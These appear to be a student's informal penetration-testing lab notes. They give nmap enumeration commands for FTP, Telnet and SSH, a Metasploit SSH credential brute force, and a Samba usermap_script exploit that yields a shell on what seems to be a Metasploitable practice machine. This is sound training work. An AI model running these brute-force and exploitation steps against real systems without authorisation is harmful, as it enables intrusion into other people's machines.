# Ftp enumeration 

Ls -al /usr/share/nmap/scripts
Ls -al /usr/share/nmap/scripts \| grep ftp
Nmap -p 21 -sS --script ftp-anpn "ip address"

![image1](../../../attachments/da0accf661b244249d790d718a666822.png)

Nmap -script ftp-anon , ftp-syst , ftp-vsftpd-backdoor , tftp-enum , tftp-version (ip address)

Can add only 1 script or all at once

Ftp 192.168.xx.xx \*\*
![image2](../../../attachments/155a8650ce6d4cccbc2b42970c6d681e.png)

# "!" to exit

# Telnet enumeration 

Ls -al /usr/share/nmap/scripts \| grep telnet
Nmap -script telnet-encryption , telnet-ntlm-info "ip address"

![image3](../../../attachments/7bdc5c2edc404c59815dc80786263a46.png)

Nmap -p 21 -sS --script telnet-encryption "ip address"

![image4](../../../attachments/0bdc704cb629479ba86ccea5442651ad.png)

Telnet "ip address"

![image5](../../../attachments/e2cb8127580646499b370dbbbfee8ada.png)

![image6](../../../attachments/34753afab0814b33b6b00fbc5526e708.png)

# 
# 
# SSH ENUMERATION

Ls -al /usr/share/nmap/scripts \| grep ssh

![image7](../../../attachments/fdc4589a073f469880a2a777cbadc81a.png)

Why ssh is secure ? Because it is encrypted

nmap -script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey,ssh-publickey-acceptance,ssh-run,sshv1 192.168.110.132

![image8](../../../attachments/e2781988285240a59608e5e8f86f12af.png)

ssh -oHostKeyAlgorithms=+ssh-dss msfadmin@192.168.110.132

Will ask for password

![image9](../../../attachments/b5ade823884b4b45aed8f4145f0e298c.png)

Pwd
Ls
exit

Private key : -oHostKeyAlgorithms=+ssh-dss
Search private key github

# Msfconsole

![image10](../../../attachments/3c254dcab5554d71afd37f1e9c2e2811.png)

Search

![image11](../../../attachments/425c61488b4d4d6786bf542e69337548.png)

Ms6 \> search ssh

![image12](../../../attachments/b859a81d281e4f9998dbe859d336c1f2.png)

Use 72 or auxiliary/scanner/ssh/ssh_login

Show options

![image13](../../../attachments/6c07a518c46e4a2b8af3790cdfe0dfc6.png)

All the options which says required "yes"
Make them true

set ANONYMOUS_LOGIN true

![image14](../../../attachments/5779c4f5b585413fbeaccd89f5d49e8f.png)

RHOSTS - remote host
LHOSTS local host

Set RHOSTS 192.168.xx.xx
Set STOP_ON_SUCCESS true (so that brute force stops when credentials are found)
Set VERBOSE true

![image15](../../../attachments/96191b633a5a469aad84dfe6c345262e.png)

Set USER_FILE/home/kali/username
Set PASS_FILE/home/kali/password

Show options
Run
Sessions -i 1

# Smb port scan

## STEP 1

Msfconsole
![image16](../../../attachments/c2c9cd0fb3f84210a115aaea8e68e89f.png)

Search
![image17](../../../attachments/3fb570d2e215486292f7336765741099.png)
Search smb
![image18](../../../attachments/29d69e0eaffd413284fe9f41a91c4011.png)

Use 388 or auxiliary/scanner/smb/smb_version
Show options

![image19](../../../attachments/51c284b212104c76b77e6606dba543c6.png)

Set RHOSTS 192.xx.xx
Run

![image20](../../../attachments/b619f39f57c44fc4906c13934b29bff9.png)
Gives the victims version of os

## STEP 2 

Exploit after knowing the os of victim

Samba 3.0.2.0 debian search on google
or
Open Another terminal

searchsploit Samba 3.0.20-Debain
![image21](../../../attachments/a5f8959c9a1a445382f1697c76a92a10.png)
Gives the exploit options for this os
We will choose the second option since our os is 3.0.20

Again go to the first terminal
Search samba
![image22](../../../attachments/c9864720451249fea38303981b82e472.png)

Use 15 or exploit/multi/samba/usermap_script
![image23](../../../attachments/72bc4fd0e44849e7baad145cd058fc34.png)

Show options
![image24](../../../attachments/c23c8614b3f24e178bf9b36a9bdded32.png)

Set RHOSTS 192.xx.xxx
![image25](../../../attachments/494339a9fc974c8ebdd26aea4cbbcca1.png)

Run/exploit
Ls
Whoami
![image26](../../../attachments/45d4ccee1e4f403e976ad6bc64013854.png)

Homework
Do exploit for smtp
Throiugh msf conslole

![image27](../../../attachments/60e65b4c9fdc4215abd559270c1d758a.png)

![image28](../../../attachments/3b4685432fed40c3827e8af547b09632.png)

![image29](../../../attachments/4360a2f8a3704b1f8eb6f40fbc684ff6.png)
